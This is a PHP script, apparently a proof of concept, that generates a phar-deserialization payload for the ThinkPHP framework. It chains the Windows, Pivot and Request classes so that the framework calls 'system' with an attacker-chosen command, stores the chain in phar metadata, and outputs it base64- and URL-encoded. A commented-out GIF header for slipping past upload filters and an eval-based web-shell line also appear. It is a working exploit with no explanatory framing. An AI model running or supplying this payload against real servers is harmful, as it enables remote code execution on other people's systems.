<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["ethan"=>["dir","calc"]];
        $this->data = ["ethan"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       => '_method',
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         => '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     => 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   => '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  => '',
        // HTTPS代理标识
        'https_agent_name' => '',
        // IP代理获取标识
        'http_agent_ip'    => 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  => 'html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>''];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}
namespace think\process\pipes;
use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;
use think\Model;
class Pivot extends Model
{
}
use think\process\pipes\Windows;
$a = new Windows();
@unlink('phar.phar');
$phar = new \Phar("phar.phar"); //后缀名必须为 phar
$phar->startBuffering();
/*$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');*/
$phar -> setStub('<?php __HALT_COMPILER();?>');
//$object = new comrare();
//$object ->haha= 'eval(@$_POST[\'a\']);';
//$object ->haha= 'phpinfo();';
$phar->setMetadata($a); //将自定义的 meta-data 存入 manifest
$phar->addFromString("test.txt", "text"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
echo urlencode(base64_encode(file_get_contents('phar.phar')));
?>